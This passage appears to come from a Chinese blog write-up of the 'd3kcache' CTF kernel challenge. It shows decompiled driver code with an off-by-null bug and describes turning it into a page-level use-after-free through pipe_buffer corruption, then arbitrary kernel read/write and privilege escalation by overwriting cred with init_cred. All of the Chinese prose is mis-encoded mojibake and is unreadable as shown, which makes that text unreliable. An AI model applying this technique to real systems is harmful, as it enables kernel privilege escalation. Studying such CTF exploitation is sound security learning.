<p>è€Œè¿™ä¸ªä¿æŠ¤ä¼šæ£€æµ‹opsæ˜¯å¦åˆæ³•ï¼Œè¿™ä¸ªæ£€æµ‹ååˆ†ä¸¥æ ¼ï¼Œéœ€è¦opsçš„å€¼ä¸ä¸€ä¸ªå›ºå®šçš„å†…å®¹è¿›è¡Œå¼‚æˆ–ï¼Œç»“æœä¸ä¸º0å°±ç›´æ¥è§¦å‘<code>kernel panic</code>ã€‚ä¹Ÿå°±æ˜¯å› ä¸ºå½“æ—¶ä¸æ¸…æ¥šè¿™ä¸ªå†…å®¹å¯¼è‡´æˆ‘è°ƒäº†åŠå¤©å»åŠ«æŒ<code>pipe_buffer</code>çš„opsæŒ‡é’ˆã€‚</p>
<h3 id="é©±åŠ¨åˆ†æ"><a href="#é©±åŠ¨åˆ†æ" class="headerlink" title="é©±åŠ¨åˆ†æ"></a>é©±åŠ¨åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_96B);</span><br><span class="line">  major_num = _register_chrdev(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_fo);</span><br><span class="line">  <span class="keyword">if</span> ( major_num &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    module_class = _class_create(&amp;_this_module, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_module_init___key);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_class &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_A0D);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">      module_device = device_create(module_class, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_device &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_A66);</span><br><span class="line">        spin = <span class="number">0</span>;</span><br><span class="line">        kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">0x800</span>LL, <span class="number">0LL</span>, <span class="number">67379200LL</span>, <span class="number">0LL</span>, <span class="number">2048LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="built_in">memset</span>(kcache_list, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">        printk(&amp;unk_A3B);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_device;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      printk(&amp;unk_9DE);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_class;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_9AD);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹åˆå§‹åŒ–æ¨¡å—éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢è°ƒç”¨äº†å‰é¢æåˆ°çš„<code>kmem_cache_create_usercopy</code>å‡½æ•°ï¼Œå¹¶ä¸”å‚æ•°ä¸­sizeæŒ‡å®šä¸º<code>0x800</code>ï¼Œé‚£ä¹ˆæ ¹æ®å‰é¢æ‰€ä»¥åˆ°çš„ï¼Œè¿™é‡Œçš„orderå³ä¸º3ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">d3kcache_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v8; <span class="comment">// r14</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  __int64 v10; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 v14; <span class="comment">// r15</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v18; <span class="comment">// r14</span></span><br><span class="line">  __int64 v19; <span class="comment">// r12</span></span><br><span class="line">  __int64 v20; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v21; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [rsp-44h] [rbp-44h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v29; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v29 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  v4 = copy_from_user(&amp;v26, a3, <span class="number">16LL</span>);</span><br><span class="line">  v5 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x80F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_882;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">      v20 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_12A0, v26);</span><br><span class="line">        v21 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v20] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_12C0, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = <span class="number">0LL</span>;</span><br><span class="line">        v21 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v20;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v21] = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_85D;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 = v27;</span><br><span class="line">      <span class="keyword">if</span> ( v27 &gt; kcache_list[<span class="number">4</span> * v26] )</span><br><span class="line">        v11 = kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">        BUG();</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11;</span><br><span class="line">      v13 = qword_17D8[<span class="number">2</span> * v26];</span><br><span class="line">      v14 = v28;</span><br><span class="line">      _check_object_size(v13, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, <span class="number">1LL</span>);</span><br><span class="line">      v5 = -(__int64)(copy_to_user(v14, v13, v12) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x114</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &lt;= <span class="number">0xF</span>uLL &amp;&amp; qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v27;</span><br><span class="line">          <span class="keyword">if</span> ( v27 &gt; <span class="number">0x800</span> || v27 + kcache_list[<span class="number">4</span> * v26] &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = qword_17D8[<span class="number">2</span> * v26] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          v9 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7;</span><br><span class="line">          v10 = v28;</span><br><span class="line">          _check_object_size(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v8 + v9) = <span class="number">0</span>;</span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_42:</span><br><span class="line">      v25 = &amp;unk_8AA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x10</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_782;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_7F6;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = kmem_cache_alloc(kcache_jar, <span class="number">0xDC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_81A;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = v15;</span><br><span class="line">    v17 = v27;</span><br><span class="line">    v18 = <span class="number">2048LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt; <span class="number">0x800</span> )</span><br><span class="line">      v18 = v27;</span><br><span class="line">    v19 = v28;</span><br><span class="line">    _check_object_size(v15, v18, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v16, v19, v18) )</span><br><span class="line">    &#123;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v22 = <span class="number">0x7FF</span>LL;</span><br><span class="line">      <span class="keyword">if</span> ( v17 &lt; <span class="number">0x7FF</span> )</span><br><span class="line">        v22 = v17;</span><br><span class="line">      *(_BYTE *)(v16 + v22) = <span class="number">0</span>;</span><br><span class="line">      v23 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_1260, v26);</span><br><span class="line">        v24 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v23] = v16;</span><br><span class="line">        <span class="keyword">if</span> ( v24 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_1280, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = v16;</span><br><span class="line">        v24 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v23;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v24] = v18;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  raw_spin_unlock(&amp;spin);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†å°±æ˜¯ioctlå‡½æ•°ï¼Œé€†å‘åˆ†æè¿‡åå¯ä»¥å‘ç°è¿™é‡Œåˆ†ä¸ºå››ä¸ªåˆ†æ”¯ï¼Œä¹Ÿå°±æ˜¯å¢åˆ æ”¹æŸ¥ï¼Œè¿™é‡Œæ¼æ´å‘ç”Ÿåœ¨å¢å’Œæ”¹çš„éƒ¨åˆ†ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„<code>off by null</code>ã€‚é™¤æ­¤ä¹‹å¤–å†æ— å…¶ä»–æ¼æ´ã€‚</p>
<h3 id="é¢„æœŸåˆ©ç”¨åˆ†æ"><a href="#é¢„æœŸåˆ©ç”¨åˆ†æ" class="headerlink" title="é¢„æœŸåˆ©ç”¨åˆ†æ"></a>é¢„æœŸåˆ©ç”¨åˆ†æ</h3><p>æ ¹æ®å‰é¢æ‰€è¿°çš„å†…å®¹ï¼Œç›®å‰å·²ç»è¾¾åˆ°äº†<code>vuln slab page</code>å’Œ<code>victim slab page</code>ç›¸é‚»çš„æƒ…å†µäº†ï¼Œè€Œç»è¿‡åç»­çš„åˆ†ææˆ‘ä»¬å¯ä»¥å¾—çŸ¥å‰é¢ä¸¤ä¸ªé¡µé¢åˆ†åˆ«å¯¹åº”çš„æ˜¯é¢˜ç›®ä¸­åˆ›å»ºçš„<code>slab page</code>å’Œ<code>pipe_buffer</code>æ‰€åœ¨çš„<code>slab_page</code>ã€‚ç­”æ¡ˆå·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨é¢˜ç›®çš„<code>off by null</code>æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®©<code>pipe_buffer-&gt;page</code>æŒ‡é’ˆæŒ‡å‘å…¶ä»–<code>pipe_buffer</code>æ‰€æŒ‡å‘çš„ä½ç½®ï¼Œè€Œå¦‚æœæˆ‘ä»¬æ§åˆ¶å…¶ä¸­ä¸€ä¸ª<code>pipe_buffer</code>å¹¶é‡Šæ”¾æ‰pageï¼Œå°±å½¢æˆäº†é¡µçº§çš„UAFã€‚ä¸è¿‡pageçš„å¤§å°åªæœ‰<code>0x40</code>æ‰€ä»¥æˆåŠŸç‡åªæœ‰1&#x2F;4ï¼Œå› ä¸ºä»¥<code>0x00</code>ç»“å°¾æ—¶<code>off by null</code>æ— æ³•å½±å“å…¶æŒ‡å‘ã€‚</p>
<p><img   src="/images/image-20230519171327450.png"  alt="image-20230519171327450"></p>
<p><img   src="/images/image-20230519171353853.png"  alt="image-20230519171353853"></p>
<p>ç›®å‰æˆ‘ä»¬å·²ç»å½¢æˆäº†é¡µçº§çš„UAFï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬åœ¨å·²ç»freeçš„pageå¤„ç”³è¯·<code>pipe_buffer</code>ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p><img   src="/images/image-20230519173248182.png"  alt="image-20230519173248182"></p>
<p>ç»“æœå°±æ˜¯ä¼šå½¢æˆå¦‚ä¸Šå›¾ä¸€æ ·çš„ç»“æ„ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æœ€å·¦è¾¹çš„<code>pipe_buffer</code>è¯»å–åˆ°å®ƒpageæŒ‡å‘çš„æ–°çš„<code>pipe_buffer</code>ä¸­çš„å†…å®¹ï¼Œå¹¶ä¸”æ­¤æ—¶æˆ‘ä»¬ä¸å…‰å¯ä»¥è¯»å–è¿˜å¯ä»¥å¯¹pageçš„å†…å®¹è¿›è¡Œå†™ï¼Œå¯ä»¥è®©æœ€å³è¾¹çš„ä¸¤ä¸ª<code>pipe_buffer</code>çš„pageæŒ‡é’ˆåˆæŒ‡å‘åŒä¸€ä¸ªï¼Œä»è€Œå½¢æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š<img   src="/images/image-20230519173704454.png"  alt="image-20230519173704454"></p>
<p>æ ¹æ®ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†æœ€å³è¾¹çš„pageç»™freeæ‰åˆä¸€æ¬¡é€ æˆäº†é¡µçº§çš„UAFï¼Œä½†æ˜¯è¿™ä¸€æ¬¡ä¸åŒçš„æ˜¯æˆ‘ä»¬é€šè¿‡ç¬¬ä¸€æ¬¡çš„æ³„æ¼å¯ä»¥çŸ¥é“æœ€å³è¾¹pageçš„åœ°å€çš„ã€‚æœ‰è¶£çš„æ¥äº†ï¼Œåœ¨æœ€å³è¾¹é€ æˆäº†é¡µçº§çš„UAFä¹‹åæˆ‘ä»¬ç»§ç»­ç”³è¯·<code>pipe_buffer</code>æ”¾åœ¨æœ€å³è¾¹çš„pageä¸­ï¼Œå¹¶ä¸”æ§åˆ¶é‡Œé¢<code>pipe_buffer</code>çš„pageæŒ‡é’ˆæŒ‡å‘è‡ªèº«ï¼Œæœ€ç»ˆå½¢æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š</p>
<p><img   src="/images/image-20230519174027597.png"  alt="image-20230519174027597"></p>
<p>å› ä¸ºæ˜¯ä¸€ä¸ªé¡µçº§UAFçš„ç¼˜æ•…ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ä¸­é—´çš„pipeå»ä¿®æ”¹ä¸‹é¢çš„å…¶ä»–<code>pipe_buffer</code>ï¼Œæ‰€ä»¥åœ¨æœ€å³ä¾§ï¼Œæˆ‘ä»¬æ€»å…±å¯ä»¥æ§åˆ¶åˆ°ä¸‰ä¸ª<code>pipe_buffer</code>ã€‚è€Œè¿™ä¸‰ä¸ª<code>pipe_buffer</code>çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š</p>
<ol>
<li>ç¬¬ä¸€ä¸ªç®¡é“é€šè¿‡pageæŒ‡é’ˆå†…å­˜ç©ºé—´çš„ä»»æ„åœ°å€è¯»å†™</li>
<li>ç¬¬äºŒä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“çš„å†…å®¹ï¼Œè®©ç¬¬ä¸‰ä¸ªç®¡é“å¯ä»¥æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li>
<li>ç¬¬ä¸‰ä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸€ä¸ªç®¡é“å’Œç¬¬äºŒä¸ªç®¡é“ï¼Œä¿®æ”¹ç¬¬ä¸€ä¸ªç®¡é“çš„pageåˆ°æŒ‡å®šä½ç½®ï¼Œä¿®æ”¹ç¬¬äºŒä¸ªç®¡é“çš„æŒ‡å‘ä¸ºç¬¬ä¸‰ä¸ªç®¡é“</li>
</ol>
<p>è¿™æ ·ä¸‰ä¸ªç®¡é“å®ç°äº’ç›¸å¾ªç¯ä¿®æ”¹ï¼Œå³å¯å®ç°æ•´ä¸ªå†…æ ¸å†…å­˜ç©ºé—´å‡ ä¹æ— ä»»ä½•é™åˆ¶çš„ä»»æ„åœ°å€è¯»å†™ã€‚</p>
<p>æ—¢ç„¶å·²ç»å¯ä»¥ä»»æ„åœ°å€æ— é™åˆ¶è¯»å†™äº†ï¼Œé‚£ä¹ˆææƒçš„æ–¹å¼ä¹Ÿå°±å¤šç§å¤šæ ·äº†ã€‚å½“ç„¶ï¼Œè¿™é‡Œéœ€è¦æå‰æ³¨æ„åˆ°çš„æ˜¯<code>pipe_buffer</code>ä¸­çš„pageæŒ‡é’ˆç»ˆå½’æ˜¯è¦æŒ‡å‘åˆ°pageç»“æ„ä½“çš„ã€‚è€Œå†…æ ¸ä¸­<code>vmemmap</code>åŒºåŸŸä¸­å­˜æ”¾ç€æ‰€æœ‰çš„pageç»“æ„ä½“ï¼Œæ‰€ä»¥é¦–è¦æ‰¾åˆ°<code>vmemmap</code>åŒºåŸŸå³å¯ã€‚</p>
<p>é‚£ä¹ˆç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡ä¿®æ”¹task_structä¸­çš„credæŒ‡é’ˆä¸º<code>init_cred</code>çš„åœ°å€ã€‚</p>
